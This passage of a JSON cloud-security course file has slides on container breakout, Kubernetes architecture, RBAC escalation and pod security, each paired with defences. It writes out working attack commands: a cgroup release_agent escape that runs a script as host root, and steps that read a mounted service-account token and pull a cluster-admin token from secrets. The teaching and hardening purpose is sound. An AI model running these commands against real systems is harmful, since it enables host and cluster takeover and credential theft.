+                  "output": "uid=0(root) gid=0(root)  <-- running on the HOST root filesystem"
+                },
+                {
+                  "command": "# Path B: --privileged, cgroup v1 release_agent escape",
+                  "output": ""
+                },
+                {
+                  "command": "mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c && mkdir /tmp/c/x",
+                  "output": ""
+                },
+                {
+                  "command": "echo 1 > /tmp/c/x/notify_on_release; host=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
+                  "output": ""
+                },
+                {
+                  "command": "echo \"$host/cmd\" > /tmp/c/release_agent; printf '#!/bin/sh\\nid > /output' > /cmd; chmod +x /cmd",
+                  "output": ""
+                },
+                {
+                  "command": "sh -c 'echo 0 > /tmp/c/x/cgroup.procs'; cat /output",
+                  "output": "uid=0(root) gid=0(root)  <-- host kernel ran our script as root"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How to spot an escapable container",
+            "body": "Before exploiting (or when auditing), enumerate the container's privileges. Signals that breakout is likely:\n- Capabilities: `capsh --print` shows cap_sys_admin, cap_sys_ptrace, cap_dac_read_search\n- Privileged flag: /proc shows almost all caps; many host devices visible in /dev\n- Mounts: `mount` or /proc/1/mountinfo shows docker.sock, host paths, or / mounted rw\n- Namespaces shared: hostPID means `ps -ef` shows host processes; check /proc/1/cgroup and compare\n- Writable sensitive paths: /var/run/docker.sock, /host, release_agent\n\nTooling automates this:\n- deepce, amicontained (Jess Frazelle), and linPEAS flag escapable misconfigs\n- CDK (Container DucK) packages many escape techniques\n- kubectl / Peirates for the Kubernetes angle (next topics)\n\nAs an auditor, the same enumeration is your checklist: anything that trips these signals is a finding.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "root@container:/#",
+              "lines": [
+                {
+                  "command": "capsh --print | grep -i sys_admin",
+                  "output": "Current: cap_sys_admin,... (DANGER: mount/namespace powers)"
+                },
+                {
+                  "command": "ls -l /var/run/docker.sock 2>/dev/null",
+                  "output": "srw-rw---- 1 root root 0 ... /var/run/docker.sock  (DANGER: socket mounted)"
+                },
+                {
+                  "command": "mount | grep -E ' / |hostpath' | head",
+                  "output": "/dev/nvme0n1p1 on /host type ext4 (rw)  (DANGER: host fs writable)"
+                },
+                {
+                  "command": "amicontained",
+                  "output": "Container Runtime: docker\nHost PID Namespace: true\nCapabilities: SYS_ADMIN  (escapable)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it: the Escape the Container lab",
+            "body": "Lab objective: break out of (a) a privileged container and (b) a container with a mounted Docker socket to run commands on the host, then harden both.\n\nSteps:\n1. Start a vulnerable container: `docker run --rm -it --privileged ubuntu bash` and separately `docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker:cli sh`.\n2. Enumerate with amicontained / capsh to confirm the weakness.\n3. Escape: use the socket path to launch a host-mounting container; use the release_agent path in the privileged one. Prove it by writing a marker file (for example /tmp/pwned_by_<you>) on the host and reading it from the host shell.\n4. Harden and re-test (next slide) until both escapes fail.\n\nSafety: do this only on a lab host you own. These techniques give real host root; never run them against infrastructure you are not authorised to test (hunting-core rule: only test what you own)."
+          },
+          {
+            "title": "Defend and harden",
+            "body": "Flip every enabling condition:\n- Never run --privileged. If you think you need it, you almost certainly need one specific capability instead.\n- Drop all capabilities, add back only the minimum: `--cap-drop=ALL --cap-add=NET_BIND_SERVICE`.\n- Never mount the Docker/containerd socket into a container. Use a rootless builder (BuildKit, Kaniko) or a sibling API with proper auth if you must build in-cluster.\n- No host namespace sharing: avoid hostPID, hostNetwork, hostIPC.\n- No writable host mounts; if a hostPath is required, mount read-only and scope it tightly.\n- Enable seccomp (Docker's default profile blocks dangerous syscalls) and AppArmor/SELinux; set `no-new-privileges`.\n- Read-only root filesystem (--read-only) so an attacker cannot drop tools.\n- Use user-namespace remap or rootless so in-container root is not host root.\n- For untrusted workloads, run under gVisor or Kata for a real kernel boundary.\n- Patch runc/containerd and the host kernel promptly.\n\nIn Kubernetes these map to the restricted Pod Security Standard and are enforced by OPA/Gatekeeper or Kyverno (topic 6).",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Escapable container",
+                  "points": [
+                    "--privileged",
+                    "docker.sock mounted",
+                    "hostPID / host mounts rw",
+                    "all caps, no seccomp"
+                  ]
+                },
+                {
+                  "label": "Hardened container",
+                  "points": [
+                    "no privileged, cap-drop ALL",
+                    "no runtime socket inside",
+                    "no host namespaces, ro mounts",
+                    "seccomp + no-new-privileges + read-only fs"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Breakout turns a single compromised app into full node compromise and, on managed Kubernetes, a pivot to the whole cloud account (topic 7). It is the difference between 'one pod got popped' and 'the cluster is gone'.\n\nThe uncomfortable truth: almost every practical breakout is a configuration choice the operator made, not a sophisticated exploit. --privileged, a mounted socket, or a host bind-mount hands the attacker the host for free. So the defense is almost entirely about secure defaults and admission policy that forbids these settings, backed by a sandboxed runtime for anything untrusted.\n\nRemember the model: the container shares the host kernel. Isolation only holds while you refuse to weaken it. Audit for privileged, sockets, host namespaces and host mounts first; they are where the real findings are."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m9-4",
+        "moduleId": "cloud-m9",
+        "number": 55,
+        "title": "Kubernetes Architecture & Threat Model",
+        "type": "theory",
+        "week": 3,
+        "description": "The cluster's components and the trust between them. The API server is the control plane; kubelet, etcd and service accounts are the key targets.",
+        "keyPoints": [
+          "API server, etcd (holds all secrets), scheduler, controller-manager, kubelet",
+          "Pods, service accounts and the auto-mounted SA token",
+          "kubelet API (port 10250) exposure and node compromise",
+          "etcd unencrypted/unauthenticated exposure = total cluster compromise",
+          "MITRE ATT&CK for Kubernetes / Microsoft Kubernetes threat matrix"
+        ],
+        "slides": [
+          {
+            "title": "What Kubernetes is, and why its design is the threat model",
+            "body": "Kubernetes (K8s) is an orchestrator: you declare the desired state (run 3 copies of this app, expose it here) and the cluster continuously makes reality match. It schedules containers (grouped into pods) across many machines (nodes).\n\nAnalogy: Kubernetes is an air-traffic control tower for containers. Planes (pods) want to land and take off; controllers (the control plane) decide where each goes, and radios (the API) carry every instruction. Compromise the tower and you control all the planes.\n\nSecurity flows from the architecture: there is a control plane (the brain) and worker nodes (the muscle). Almost every action is an API call to one component, the API server, and everything persistent lives in one database, etcd. So the threat model is really 'who can talk to the API server, and who can read etcd'. This topic maps the components, the trust between them, and the prime targets, using the MITRE ATT&CK for Containers matrix as the shared language."
+          },
+          {
+            "title": "The control plane and worker nodes",
+            "body": "Control plane (the brain, usually on dedicated/managed nodes):\n- kube-apiserver: the front door. Every request (kubectl, controllers, kubelets) goes through it; it does authentication, authorization (RBAC) and admission. It is the only component that talks to etcd.\n- etcd: the key-value database holding ALL cluster state, including every Secret. Whoever reads etcd reads every secret.\n- kube-scheduler: decides which node a new pod runs on.\n- kube-controller-manager: runs control loops (replicas, nodes, service accounts) that drive actual toward desired state.\n\nWorker nodes (the muscle):\n- kubelet: the agent on each node; talks to the container runtime to start/stop pods and reports status. Exposes an API on port 10250.\n- kube-proxy: programs node networking for Services.\n- container runtime: containerd/CRI-O actually runs the containers.\n\nTrust: components authenticate to the API server (certs/tokens); the API server is the policy decision point. Break the API server or etcd and the cluster is yours.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "user",
+                  "label": "kubectl / CI"
+                },
+                {
+                  "id": "api",
+                  "label": "kube-apiserver (authn/authz/admission)",
+                  "highlighted": true
+                },
+                {
+                  "id": "etcd",
+                  "label": "etcd (all state + secrets)",
+                  "highlighted": true
+                },
+                {
+                  "id": "sched",
+                  "label": "scheduler"
+                },
+                {
+                  "id": "cm",
+                  "label": "controller-manager"
+                },
+                {
+                  "id": "kubelet",
+                  "label": "kubelet (node, :10250)"
+                },
+                {
+                  "id": "rt",
+                  "label": "container runtime"
+                },
+                {
+                  "id": "pod",
+                  "label": "pods"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "user",
+                  "to": "api",
+                  "label": "API calls"
+                },
+                {
+                  "from": "api",
+                  "to": "etcd",
+                  "label": "reads/writes state"
+                },
+                {
+                  "from": "sched",
+                  "to": "api",
+                  "label": "watch/assign"
+                },
+                {
+                  "from": "cm",
+                  "to": "api",
+                  "label": "reconcile"
+                },
+                {
+                  "from": "kubelet",
+                  "to": "api",
+                  "label": "register/report"
+                },
+                {
+                  "from": "kubelet",
+                  "to": "rt",
+                  "label": "start pods"
+                },
+                {
+                  "from": "rt",
+                  "to": "pod",
+                  "label": "runs"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Pods, service accounts and the auto-mounted token",
+            "body": "A pod is one or more containers that share a network namespace and can share volumes; it is the smallest deployable unit. Each pod runs under a ServiceAccount (SA), the pod's identity to the API server.\n\nCritical default: unless you turn it off, Kubernetes auto-mounts the SA's token into every pod at /var/run/secrets/kubernetes.io/serviceaccount/token. That JWT lets the pod call the API server as that SA.\n\nWhy attackers love this: if they get code execution in a pod, the SA token is sitting on disk. They read it, point kubectl (or curl) at the API server, and now have exactly the SA's permissions. If that SA has broad RBAC (a common mistake), one popped pod becomes cluster control. This is the Kubernetes analogue of finding cloud credentials on a compromised host.\n\nModern clusters use short-lived, audience-bound projected tokens instead of legacy forever-tokens, which limits the damage window.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Attacker in a pod",
+                  "detail": "RCE via app vuln"
+                },
+                {
+                  "label": "Read SA token",
+                  "detail": "cat /var/run/secrets/.../token"
+                },
+                {
+                  "label": "Call API server",
+                  "detail": "kubectl --token=... auth can-i --list"
+                },
+                {
+                  "label": "Inherit SA rights",
+                  "detail": "broad RBAC -> cluster takeover"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Mechanism: the kubelet API on port 10250",
+            "body": "The kubelet is the per-node agent. It exposes an HTTPS API on port 10250 that can list pods and, crucially, exec commands inside any pod on that node (the same mechanism kubectl exec uses, but direct to the kubelet).\n\nThe danger is authentication mode. If the kubelet is configured with --anonymous-auth=true or weak authz (older/default or misconfigured setups), anyone who can reach port 10250 on a node can run commands in that node's pods without credentials, read their secrets and pivot. Even with auth on, a stolen node credential grants the same.\n\nThe healthz/read-only port 10255 (now usually disabled) historically leaked pod and env data unauthenticated.\n\nSo node compromise and kubelet exposure are near-equivalent: control the kubelet, control everything scheduled on that node. Network policy and firewalling 10250 to the control plane only, plus webhook authn/authz, are the fixes.",
+            "check": {
+              "question": "An attacker can reach a node's kubelet API on port 10250 and it allows anonymous auth. What can they do?",
+              "options": [
+                "Nothing, 10250 only serves health checks",
+                "Execute commands inside the pods running on that node and read their secrets, without credentials",
+                "Only restart the node",
+                "Change the cluster's DNS name"
+              ],
+              "correctIndex": 1,
+              "explanation": "The kubelet API supports exec into pods on its node. With anonymous auth enabled (or a stolen node credential), an attacker runs commands in those pods and harvests their secrets and SA tokens, enabling pivot. Restrict 10250 to the control plane and require webhook authn/authz."
+            }
+          },
+          {
+            "title": "Worked example: enumerate the cluster from a foothold",
+            "body": "A realistic first five minutes after landing in a pod. The attacker confirms they are in Kubernetes, grabs the SA token, and asks the API server what that identity can do. 'auth can-i --list' is the single most useful recon command: it enumerates the SA's effective permissions.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "env | grep KUBERNETES",
+                  "output": "KUBERNETES_SERVICE_HOST=10.96.0.1\nKUBERNETES_SERVICE_PORT=443"
+                },
+                {
+                  "command": "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+                  "output": ""
+                },
+                {
+                  "command": "curl -sk -H \"Authorization: Bearer $TOKEN\" https://10.96.0.1/api/v1/namespaces/default/pods | head",
+                  "output": "{ \"kind\": \"PodList\", \"items\": [ ... ]   # SA can list pods"
+                },
+                {
+                  "command": "kubectl --token=$TOKEN --server=https://10.96.0.1 --insecure-skip-tls-verify auth can-i --list",
+                  "output": "Resources   Verbs\nsecrets     [get list]\npods        [get list create]\npods/exec   [create]   <-- escalation primitive"
+                }
+              ]
+            }
+          },
+          {
+            "title": "etcd: the crown jewels",
+            "body": "etcd stores the entire cluster state as key-value data, including every Secret object. By default (before encryption-at-rest is configured) Secrets are only base64-encoded in etcd, which is encoding, not encryption.\n\nAttack consequences:\n- Unauthenticated or unencrypted etcd exposure (for example client port 2379 reachable, or an etcd backup leaked) = total cluster compromise. An attacker reads every Secret: database passwords, cloud credentials, TLS keys, SA tokens.\n- Writing to etcd directly lets an attacker forge any object, bypassing the API server's RBAC and admission entirely.\n\nDefenses:\n- Enable encryption at rest for Secrets (EncryptionConfiguration; ideally with a KMS provider like AWS KMS, not just aescbc).\n- Require mutual TLS and strong auth on etcd; firewall 2379/2380 to the control plane only.\n- On managed clusters (EKS/GKE/AKS) the provider runs and encrypts etcd for you, which is a major reason to prefer managed control planes.\n- Protect etcd backups/snapshots as tightly as etcd itself.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Exposed / unencrypted etcd",
+                  "points": [
+                    "Secrets only base64-encoded",
+                    "Reach :2379 = read every secret",
+                    "Direct write bypasses RBAC/admission",
+                    "= total cluster compromise"
+                  ]
+                },
+                {
+                  "label": "Protected etcd",
+                  "points": [
+                    "Encryption at rest via KMS",
+                    "mTLS + firewalled to control plane",
+                    "No direct client access",
+                    "Backups encrypted & access-controlled"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Threat matrices and why this map matters",
+            "body": "To reason systematically, use a published matrix as your map:\n- MITRE ATT&CK for Containers: tactics from Initial Access through Privilege Escalation, Credential Access (steal SA tokens), Lateral Movement and Impact, with Kubernetes-specific techniques.\n- Microsoft's Threat Matrix for Kubernetes: the original K8s-focused matrix (exposed dashboard, kubelet, app vuln -> SA token -> cluster-admin).\n\nWhy build this model before attacking or defending:\n- It tells you where to look first: the API server (who can reach it, with what rights), etcd (is it protected), the kubelet (is 10250 locked down), and SA tokens (how broad is RBAC).\n- As a defender it structures hardening: CIS Kubernetes Benchmark controls, Pod Security Standards (topic 6), and least-privilege RBAC (topic 5) each defend a specific square.\n\nThe rest of the module attacks and defends these exact targets. This topic is the map; the following labs are the territory."
+          },
+          {
+            "title": "Why it matters",
+            "body": "Kubernetes centralizes power: one API server mediates everything, one etcd holds every secret, and every pod carries an identity token on disk. That concentration is efficient and also means a single weak link (an over-privileged SA, an exposed kubelet, an unencrypted etcd) can cascade to full cluster and cloud-account compromise.\n\nKey takeaways to carry forward:\n- The API server is the policy decision point. Control who can call it and with what RBAC.\n- etcd is the crown jewels. Encrypt it, firewall it, protect its backups.\n- The kubelet (10250) is node-level power. Lock it down.\n- The auto-mounted SA token turns any pod RCE into an identity. Disable auto-mount where unneeded and keep RBAC least-privilege.\n\nHold this map. Topics 5, 6 and 7 are each a deep dive into defending one part of it: RBAC/identity, in-cluster runtime guardrails, and the bridge to the cloud account."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m9-5",
+        "moduleId": "cloud-m9",
+        "number": 56,
+        "title": "Kubernetes RBAC & Service Accounts",
+        "type": "lab",
+        "week": 3,
+        "description": "Cluster identity and its escalation paths. Over-broad RBAC and mounted SA tokens are the Kubernetes equivalent of IAM privilege escalation.",
+        "keyPoints": [
+          "Roles/ClusterRoles and RoleBindings; the dangerous verbs (create pods, exec, secrets get)",
+          "Escalation: pods/exec, create pod with hostPath, impersonate, bind higher roles",
+          "Stealing and using mounted service-account tokens",
+          "Tools: kubectl auth can-i, kubiscan, rbac-tool, Peirates for attack automation",
+          "Mitigation: least-privilege RBAC, disable auto-mount, short-lived projected tokens"
+        ],
+        "slides": [
+          {
+            "title": "What Kubernetes RBAC and service accounts are",
+            "body": "RBAC (Role-Based Access Control) is how Kubernetes decides who is allowed to do what to which resources. Every API request is checked against RBAC before it runs.\n\nTwo kinds of identity:\n- Users / groups: humans and external systems (authenticated by certs, OIDC, cloud IAM).\n- ServiceAccounts (SA): identities for workloads (pods) inside the cluster.\n\nAnalogy: RBAC is the building's access-card system. A Role is a keycard profile ('can open doors on floor 3'); a RoleBinding is the act of handing that card to a specific person or robot. A ServiceAccount is the robot's own card, and it is sitting in the robot's pocket (the mounted token).\n\nThe security problem is the same as cloud IAM: over-broad permissions and escalation paths. An SA with too many rights, or a Role with a dangerous verb, lets an attacker who controls one pod climb to cluster-admin. This topic covers how RBAC is structured, the dangerous verbs, the real escalation paths, the tools to find them, and least-privilege mitigation."
+          },
+          {
+            "title": "How RBAC is structured",
+            "body": "Four object types, combined like Lego:\n- Role: a set of permissions (rules) within ONE namespace. Each rule = apiGroups + resources + verbs (get, list, watch, create, update, delete).\n- ClusterRole: the same, but cluster-wide (or for cluster-scoped resources like nodes, and for reuse across namespaces).\n- RoleBinding: grants a Role (or ClusterRole) to a subject (user, group or SA) within a namespace.\n- ClusterRoleBinding: grants a ClusterRole to a subject across the WHOLE cluster. This is the big one: a ClusterRoleBinding to cluster-admin is god mode.\n\nRBAC is additive and deny-by-default: you have no permissions unless a binding grants them; there are no explicit deny rules. To know what an identity can do, you union all its bindings.\n\nThe practical rule: scope with Role + RoleBinding (namespaced) whenever possible; reserve ClusterRole/ClusterRoleBinding for things that truly must be cluster-wide.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "sa",
+                  "label": "ServiceAccount: build-bot",
+                  "highlighted": true
+                },
+                {
+                  "id": "rb",
+                  "label": "RoleBinding (namespace ci)"
+                },
+                {
+                  "id": "role",
+                  "label": "Role: pod-reader"
+                },
+                {
+                  "id": "crb",
+                  "label": "ClusterRoleBinding"
+                },
+                {
+                  "id": "ca",
+                  "label": "ClusterRole: cluster-admin",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "sa",
+                  "to": "rb",
+                  "label": "subject of"
+                },
+                {
+                  "from": "rb",
+                  "to": "role",
+                  "label": "grants (scoped)"
+                },
+                {
+                  "from": "sa",
+                  "to": "crb",
+                  "label": "if bound here = danger"
+                },
+                {
+                  "from": "crb",
+                  "to": "ca",
+                  "label": "grants god mode"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The dangerous verbs and resources",
+            "body": "Not all permissions are equal. These are the ones that enable escalation or full compromise, so treat them as high-value:\n\n- secrets [get/list]: read every secret in scope, including other SAs' tokens and cloud credentials.\n- pods [create]: schedule a pod. You can mount a hostPath, use a privileged securityContext, or mount another SA's token, pivoting to the node or a higher identity.\n- pods/exec, pods/attach: run commands inside existing pods (steal their secrets/tokens).\n- create on deployments/daemonsets/jobs/cronjobs: indirectly create pods, same power as pods/create, often overlooked.\n- impersonate (users/groups/serviceaccounts): act AS another, higher-privileged identity.\n- bind and escalate on roles/clusterroles: grant yourself higher permissions (the RBAC escalation verbs).\n- * on * (wildcard) or cluster-admin: total control.\n- access to nodes/proxy or the kubelet: run on nodes.\n\nAudit question for any Role: 'does this grant any verb on this list?' If yes, justify it or cut it.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Benign permissions",
+                  "points": [
+                    "get/list configmaps",
+                    "get/list/watch pods (read-only)",
+                    "get services",
+                    "read own namespace"
+                  ]
+                },
+                {
+                  "label": "Escalation-enabling (scrutinize)",
+                  "points": [
+                    "secrets get/list",
+                    "pods create / pods/exec",
+                    "impersonate",
+                    "bind, escalate, * on *"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Mechanism: how pods/exec and pods/create escalate",
+            "body": "Two of the most common real-world escalations:\n\npods/exec: if your SA can exec into pods, you can exec into a pod whose SA (or mounted secrets) is more privileged than yours, read ITS token, and become that identity. One modest permission becomes someone else's power.\n\npods/create: creating a pod lets you choose its spec. You can:\n- set serviceAccountName to a high-privileged SA in that namespace, mounting ITS token into a pod you control;\n- set a hostPath volume mounting the node's filesystem, or hostPID/privileged, to break out to the node (topic 3);\n- then from the node, reach other pods' secrets or the node's cloud role (topic 7).\n\nSo 'can create pods' is effectively 'can run arbitrary code as any SA in this namespace and often on the node'. This is why the restricted Pod Security Standard (topic 6) and admission policy that blocks privileged/hostPath pods are essential companions to RBAC.",
+            "check": {
+              "question": "An attacker controls an SA that has only 'create pods' in the 'payments' namespace. Why is this often enough to escalate?",
+              "options": [
+                "It lets them read the API server's TLS key directly",
+                "They can create a pod that mounts a more-privileged SA's token or uses hostPath/privileged to break out to the node",
+                "It automatically makes them cluster-admin with no further steps everywhere",
+                "It only allows viewing pods, so it cannot escalate"
+              ],
+              "correctIndex": 1,
+              "explanation": "Creating a pod means controlling its spec: they can set serviceAccountName to a higher-privileged SA (stealing its token) or set hostPath/privileged/hostPID to escape to the node. That is why pods/create is a dangerous verb and must be paired with Pod Security restrictions."
+            }
+          },
+          {
+            "title": "Worked example: find and walk an escalation path",
+            "body": "From a foothold pod, enumerate RBAC, discover a dangerous verb, and use it. 'kubectl auth can-i --list' with the stolen token shows effective permissions; kubectl-who-can and kubiscan map which subjects hold risky verbs cluster-wide.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "kubectl --token=$SA_TOKEN auth can-i --list -n payments",
+                  "output": "Resources        Verbs\npods             [get list create]\nsecrets          [get list]   <-- can read secrets\nserviceaccounts  [get list]"
+                },
+                {
+                  "command": "kubectl --token=$SA_TOKEN get secrets -n payments -o jsonpath='{.items[*].metadata.name}'",
+                  "output": "db-creds  admin-sa-token-xr29  tls-key"
+                },
+                {
+                  "command": "kubectl --token=$SA_TOKEN get secret admin-sa-token-xr29 -n payments -o jsonpath='{.data.token}' | base64 -d > admin.jwt",
+                  "output": ""
+                },
+                {
+                  "command": "kubectl --token=$(cat admin.jwt) auth can-i --list | grep '\\*'",
+                  "output": "*.*   [*]   <-- stolen a cluster-admin-level SA token: game over"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Tools and the lab",
+            "body": "Attacker and auditor tooling (same tools, different intent):\n- kubectl auth can-i / can-i --list: ground truth for 'what can this identity do'.\n- kubectl-who-can (Aqua): 'who can <verb> <resource>' across the cluster.\n- KubiScan (CyberArk): finds risky roles, bindings and pods holding privileged SA tokens.\n- rbac-tool (Alcide/rbac.dev): visualize and analyze RBAC, generate least-privilege roles from audit logs.\n- rakkess: access matrix per resource.\n- Peirates: attack automation that chains token theft, RBAC abuse and node pivot.\n\nLab (Kubernetes Attack Path, kind/minikube + Peirates): from a foothold pod, enumerate RBAC with auth can-i, steal a service-account token, abuse a dangerous verb (secrets get or pods/exec or pods/create) to escalate toward cluster-admin, then write the least-privilege Role/RoleBinding that removes the dangerous verb and re-run the attack to prove it now fails. Verify success by the escalation command returning 'no' from auth can-i after the fix.\n\nSafety: lab cluster you own only."
+          },
+          {
+            "title": "Defend: least-privilege RBAC and token hygiene",
+            "body": "Mitigations, in priority order:\n- Least privilege: grant the minimum verbs on the minimum resources in the minimum scope. Prefer Role+RoleBinding (namespaced) over ClusterRole/ClusterRoleBinding. Never grant cluster-admin to workloads.\n- Eliminate dangerous verbs unless justified: audit for secrets get/list, pods create, pods/exec, impersonate, bind, escalate, and wildcards. Generate tight roles from real usage (rbac-tool, audit2rbac).\n- Disable SA token auto-mount where the pod does not call the API: automountServiceAccountToken: false on the SA or pod. Most app pods never need the token.\n- Use short-lived, audience-bound projected tokens (default in modern clusters) instead of legacy non-expiring secret tokens; and TokenRequest API so tokens expire and are scoped.\n- Separate SAs per workload; do not share one powerful SA across many pods.\n- Review with kubiscan/kubectl-who-can in CI; alert on new ClusterRoleBindings.\n- Enforce with admission policy (Kyverno/Gatekeeper) to block creation of dangerous bindings or privileged pods (ties to topic 6).\n\nThis is the Kubernetes equivalent of cloud IAM least privilege.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Audit",
+                  "detail": "kubiscan / who-can find risky verbs & bindings"
+                },
+                {
+                  "label": "Scope down",
+                  "detail": "Role+RoleBinding, drop secrets/exec/create"
+                },
+                {
+                  "label": "Token hygiene",
+                  "detail": "automount:false, short-lived projected tokens"
+                },
+                {
+                  "label": "Enforce",
+                  "detail": "admission blocks dangerous bindings & privileged pods"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "RBAC is where in-cluster privilege escalation lives. The pattern is always the same: an attacker lands in a pod, reads its SA token, asks the API server what that identity can do, and walks a dangerous verb (read secrets, exec, create pods, impersonate, bind) up to cluster-admin. From cluster-admin they reach every secret and, via node pods, the cloud account (topic 7).\n\nThe defense is boring and effective: least privilege. Most workloads need almost no API permissions and should not even mount a token. The findings in a real assessment are over-broad ClusterRoleBindings, SAs with secrets/get, and pods/create or exec granted 'for convenience'.\n\nCarry this: in Kubernetes, the SA token is a credential and RBAC is the blast radius. Keep both minimal, and pair RBAC with Pod Security so that even 'create a pod' cannot be abused into a node breakout."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m9-6",
+        "moduleId": "cloud-m9",
+        "number": 57,
+        "title": "Pod Security, Network Policy & Secrets",
+        "type": "lab",
+        "week": 3,
+        "description": "The runtime guardrails inside the cluster. Students enforce pod-level restrictions, segment pod traffic and protect cluster secrets.",
+        "keyPoints": [
+          "Pod Security Admission (restricted/baseline) replacing PodSecurityPolicy",
+          "NetworkPolicies for default-deny east-west traffic (Calico/Cilium)",
+          "etcd encryption at rest for Kubernetes secrets; external secret stores",
+          "Admission control: OPA/Gatekeeper, Kyverno for policy-as-code",
+          "seccomp, AppArmor and read-only root filesystems per pod"
+        ],
+        "slides": [
+          {
+            "title": "What runtime guardrails inside the cluster are",
+            "body": "RBAC (topic 5) controls who can talk to the API server. But once a pod is running, you need controls on what that pod can DO on its node and across the network, and on how cluster secrets are stored. Those are the in-cluster runtime guardrails:\n- Pod Security: restrict what a pod spec may request (no privileged, no hostPath, drop caps).\n- Network Policy: restrict which pods can talk to which (segment east-west traffic).\n- Secrets protection: encrypt secrets at rest and keep them out of pods.\n- Admission control: policy-as-code that enforces all of the above at creation time.\n\nAnalogy: RBAC is who gets a building pass. These guardrails are the fire doors, internal locked corridors and the safe in the manager's office: even a person inside the building cannot wander everywhere or open everything. Defense in depth means assuming one layer fails and still containing the blast. This topic covers Pod Security Admission, NetworkPolicies, secret encryption and external stores, OPA/Gatekeeper and Kyverno, and per-pod seccomp/AppArmor/read-only root."
+          },
+          {
+            "title": "Pod Security Admission (replacing PSP)",
+            "body": "PodSecurityPolicy (PSP) was removed in Kubernetes 1.25. Its replacement is Pod Security Admission (PSA), a built-in admission controller that enforces the Pod Security Standards:\n- privileged: no restrictions (for trusted infra only).\n- baseline: blocks the most obvious dangers (privileged, hostNetwork/PID/IPC, most hostPath, adding dangerous caps).\n- restricted: hardened best practice: must run as non-root, drop ALL capabilities, no privilege escalation, seccomp RuntimeDefault, read-only-ish, no host namespaces.\n\nYou label a namespace with the level and a mode:\n- enforce (reject violating pods), audit (log), warn (message the user).\n\nExample: kubectl label ns app pod-security.kubernetes.io/enforce=restricted. Now a pod requesting privileged or hostPath is rejected at creation. This directly neutralizes the topic-3 breakout setups and the topic-5 pods/create escalation, because even an attacker who can create pods cannot create a privileged or host-mounting one.\n\nPSA is namespace-level and coarse; for fine-grained rules, pair it with Kyverno/Gatekeeper.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "privileged / baseline (looser)",
+                  "points": [
+                    "privileged allows anything",
+                    "baseline blocks obvious escapes",
+                    "hostPath mostly blocked (baseline)",
+                    "still allows running as root"
+                  ]
+                },
+                {
+                  "label": "restricted (recommended)",
+                  "points": [
+                    "runAsNonRoot required",
+                    "drop ALL capabilities",
+                    "no privilege escalation, no host ns",
+                    "seccomp RuntimeDefault"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Network Policy: default-deny east-west",
+            "body": "By default, Kubernetes networking is wide open: every pod can reach every other pod on any port. So one compromised pod can scan and attack the whole cluster laterally. NetworkPolicies fix this.\n\nA NetworkPolicy is a firewall rule for pods, selected by labels, controlling ingress (who may connect in) and egress (where it may connect out). The key pattern is default-deny: a policy that selects all pods and allows nothing, then explicit allow policies for the flows you actually need (for example 'frontend may talk to backend:8080', 'backend may reach the database').\n\nImportant: NetworkPolicy is only enforced if your CNI plugin supports it. Calico and Cilium do; the default kubenet/flannel may not. Cilium adds L7 (HTTP-aware) policies and identity-based rules.\n\nThis limits blast radius: a popped pod can only reach its declared neighbours, not the whole cluster, and egress policy can stop it beaconing out or reaching the metadata endpoint (topic 7).",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "att",
+                  "label": "compromised pod",
+                  "highlighted": true
+                },
+                {
+                  "id": "fe",
+                  "label": "frontend"
+                },
+                {
+                  "id": "be",
+                  "label": "backend"
+                },
+                {
+                  "id": "db",
+                  "label": "database",
+                  "highlighted": true
+                },
+                {
+                  "id": "np",
+                  "label": "default-deny + allow"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "att",
+                  "to": "db",
+                  "label": "BLOCKED by default-deny"
+                },
+                {
+                  "from": "fe",
+                  "to": "be",
+                  "label": "allowed :8080"
+                },
+                {
+                  "from": "be",
+                  "to": "db",
+                  "label": "allowed :5432"
+                },
+                {
+                  "from": "np",
+                  "to": "att",
+                  "label": "no matching allow -> denied"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Mechanism: how default-deny changes lateral movement",
